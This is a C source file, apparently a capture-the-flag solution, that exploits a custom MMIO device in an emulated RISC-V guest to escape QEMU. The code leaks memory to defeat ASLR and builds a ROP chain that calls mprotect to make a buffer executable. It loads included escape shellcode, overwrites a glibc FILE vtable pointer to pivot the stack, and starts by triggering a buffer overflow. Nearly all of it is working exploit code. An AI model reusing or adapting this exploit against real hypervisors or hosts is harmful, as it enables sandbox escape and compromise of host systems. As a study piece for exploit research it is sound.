#include "ministd.h"
#include "qemu-escape-shellcode.h"
#include "trusted_lib_api.h"
#include <stdint.h>

_Static_assert(sizeof(qemu_escape_shellcode_bin) <= 0x700, "Shellcode binary too big!");

#define MMIO_BASE 0x13370000
#define MODE_CREATE_PLAIN 0x1100
#define REG_MODE 0x00
#define REG_LENDW 0x08
#define REG_FILEDW 0x0C

static inline void _mmio_write_dw(uint64_t base, uint32_t offset, uint32_t val)
{
    *(volatile uint32_t*)(base + offset) = val;
}

static inline uint32_t _mmio_read_dw(uint64_t base, uint32_t offset)
{
    return *(volatile uint32_t*)(base + offset);
}

void read_mem_chunk(uint8_t* out, uint32_t chunk_len)
{
    for (uint32_t i = 0; i < chunk_len / 4; ++i) {
        char line[16] = { 0 };
        for (uint32_t j = 0; j < 4; ++j) {
            uint32_t dw = _mmio_read_dw(MMIO_BASE, REG_FILEDW);
            *(uint32_t*)&line[j * 4] = dw;
        }
        memcpy(&out[i * 16], line, sizeof(line));
    }
}

void set_total_len_and_reset_position(uint32_t total_len)
{
    // Reset s->file_pos
    _mmio_write_dw(MMIO_BASE, REG_MODE, MODE_CREATE_PLAIN);
    _mmio_write_dw(MMIO_BASE, REG_MODE, 0xffff);
    _mmio_write_dw(MMIO_BASE, REG_LENDW, total_len / 4);
}

uint8_t data[0x1100];

uint32_t hi_dword(uint64_t val)
{
    return (uint32_t)((val >> 32) & 0xFFFFFFFF);
}

uint32_t lo_dword(uint64_t val)
{
    return (uint32_t)(val & 0xFFFFFFFF);
}

#define WRITE_QW(VAL)                                                                              \
    do {                                                                                           \
        _mmio_write_dw(MMIO_BASE, REG_FILEDW, lo_dword(VAL));                                      \
        _mmio_write_dw(MMIO_BASE, REG_FILEDW, hi_dword(VAL));                                      \
    } while (0)

#define READ_QW()                                                                                  \
    (__extension__({                                                                               \
        uint64_t __ret = 0;                                                                        \
        __ret |= (uint64_t)_mmio_read_dw(MMIO_BASE, REG_FILEDW);                                   \
        __ret |= (uint64_t)_mmio_read_dw(MMIO_BASE, REG_FILEDW) << 32;                             \
        __ret;                                                                                     \
    }))

__attribute__((used)) void do_qemu_exploit()
{
    mini_printf("Exploit started! %llx, %llx\n", 0x4142434445464748ull, 0x494a4b4c4d4e4f50ull);

    set_total_len_and_reset_position(0xffffffff);
    read_mem_chunk(data, 0x1000);

    const uint64_t qemu_base = *(uint64_t*)&data[0x90c] - 0x53f0d0;
    const uint64_t s_file_buffer = *(uint64_t*)&data[0x994] + 0x59c;
    const uint64_t shellcode_location = s_file_buffer;
    const uint64_t fake_io_vtable = s_file_buffer + 0x700;

    mini_printf("QEMU base: 0x%llx\n", qemu_base);
    // mini_printf("Heap base: 0x%llx\n", heap_base);
    mini_printf("File buffer at: 0x%llx\n", s_file_buffer);

    // 0x000000000083451e : push rcx ; sal bl, 0xf ; pop rsp ; ret
    const uint64_t push_rcx_sal_bl_pop_rsp_ret = qemu_base + 0x000000000083451e;
    // int mprotect(rdi = void *addr, rsi = size_t len, rdx = int prot);
    const uint64_t mprotect = qemu_base + 0x0000000000B5CF30;
    // 0x00000000004f4859 : pop rdi ; ret
    const uint64_t pop_rdi_ret = qemu_base + 0x00000000004f4859;
    // 0x00000000003b6cae : pop rsi ; ret
    const uint64_t pop_rsi_ret = qemu_base + 0x00000000003b6cae;
    // 0x00000000006dfaca : pop rdx ; ret
    const uint64_t pop_rdx_ret = qemu_base + 0x00000000006dfaca;

    // Place some data (pivoted stack + ROP, fake function table)
    _mmio_write_dw(MMIO_BASE, REG_MODE, MODE_CREATE_PLAIN);
    _mmio_write_dw(MMIO_BASE, REG_MODE, 0xffff);
    _mmio_write_dw(MMIO_BASE, REG_LENDW, 0x100ffff); // arbitrary large value
    for (uint32_t i = 0; i < 0x700 / 4; ++i) {       // 0x700 bytes for the shellcode
        uint32_t dw = *(uint32_t*)&qemu_escape_shellcode_bin[i * 4];
        _mmio_write_dw(MMIO_BASE, REG_FILEDW, dw);
    }

    WRITE_QW(pop_rdi_ret);
    WRITE_QW(shellcode_location & 0xFFFFFFFFFFFFF000ull); // rdi (page-aligned address)
    WRITE_QW(pop_rsi_ret);                                //
    WRITE_QW(0x10000);                                    // rsi (length)
    WRITE_QW(pop_rdx_ret);                                //
    WRITE_QW(0x7); // rdx (PROT_READ | PROT_WRITE | PROT_EXEC)
    WRITE_QW(mprotect);
    WRITE_QW(pop_rdi_ret);
    WRITE_QW(s_file_buffer - 0x10000); // rdi = new rsp location
    WRITE_QW(shellcode_location);      // finally, jump to our shellcode
    WRITE_QW(0x5050505050505050);

    // Place fake _IO function pointer at offset +0x58 (from structure start),
    // that will do the stack pivot
    WRITE_QW(push_rcx_sal_bl_pop_rsp_ret);

    // Now start file-hunting loop (look for FILE signature 0x00000000fbad0000, at 8-byte aligned
    // offsets)
    set_total_len_and_reset_position(0x50505050);
    // Skip first 4 bytes (alignment)
    _mmio_read_dw(MMIO_BASE, REG_FILEDW);

    for (;;) {
        uint64_t qw = READ_QW();
        if ((qw & 0xFFFFFFFFFFFF0000ull) == 0x00000000fbad0000ull) {
            mini_printf("Found potential FILE struct to abuse 0x%llx!\n", qw);
            break;
        }
    }

    // Advance to vtable pointer (offset +0xd8 from structure start)
    for (uint32_t i = 0; i < 0xd8 - 8; i += 8) {
        uint64_t qw = READ_QW();
        mini_printf("Advancing to vtable: read 0x%llx\n", qw);
    }

    // Overwrite vtable pointer to point to our fake vtable
    // 0x55557e9d5cf8 —▸ 0x750c15c2a760 (_IO_file_jumps)
    WRITE_QW(fake_io_vtable);

    ENTRY_POINT_END();
}

void proxy()
{
    __asm__ __volatile__(
        ".globl proxy_blob_begin\n"
        "proxy_blob_begin:\n"
        ".option push\n"
        ".option nopic\n" // ensure `la` expands to auipc+addi, not GOT
        ".option norvc\n"

        "la     t0, __abs_target\n" // GAS expands to auipc+addi with proper hi/lo pairing
        "ld     t0, 0(t0)\n"        // t0 = *(abs_target) = do_qemu_exploit
        "jalr   ra, t0, 0\n"        // call absolute target
        "ret\n"

        ".balign 8\n"
        "__abs_target:\n"
        ".dword  do_qemu_exploit\n" // embed absolute pointer inside the blob

        ".option pop\n"
        ".globl proxy_blob_end\n"
        "proxy_blob_end:\n");
}

ENTRY_POINT_ATTR void start()
{
    // Triggers BOF, and jumps to our pre-inited data.
    memcpy((void*)0x313130, (void*)&proxy, 0x40);
    TRUSTED_CALL_VOID(mini_printf, "%b\n", 0b110ull << 56ull);
    ENTRY_POINT_END();
}
